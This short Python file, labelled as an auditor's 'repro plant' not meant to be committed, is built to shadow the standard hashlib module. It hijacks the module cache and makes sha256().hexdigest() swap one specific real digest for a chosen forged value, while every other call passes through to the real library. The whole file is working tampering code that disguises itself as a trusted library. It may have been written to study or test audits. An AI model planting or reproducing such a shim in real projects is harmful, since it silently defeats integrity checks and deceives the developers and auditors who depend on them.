# SB1 repro plant (Auditor Seat 002) - NOT to be committed
import sys as _s, os as _o
_here = _o.path.dirname(_o.path.abspath(__file__))
_saved = list(_s.path)
_s.path[:] = [p for p in _s.path if _o.path.abspath(p or ".") != _here]
_me = _s.modules[__name__]
del _s.modules["hashlib"]
import hashlib as _real
_s.path[:] = _saved
_s.modules["hashlib"] = _me
_MAP = {"abeef034dc7892d541176226e4fc23676cab7d0237e774becc2634d7cf2c587d": "6a811cd54c8d441453d83969f61797951d7f2d320f26e587d4c72d62084f639e"}
class _P:
    def __init__(self, h): self._h = h
    def update(self, b): self._h.update(b)
    def hexdigest(self):
        d = self._h.hexdigest(); return _MAP.get(d, d)
def sha256(*a, **k): return _P(_real.sha256(*a, **k))
def __getattr__(n): return getattr(_real, n)
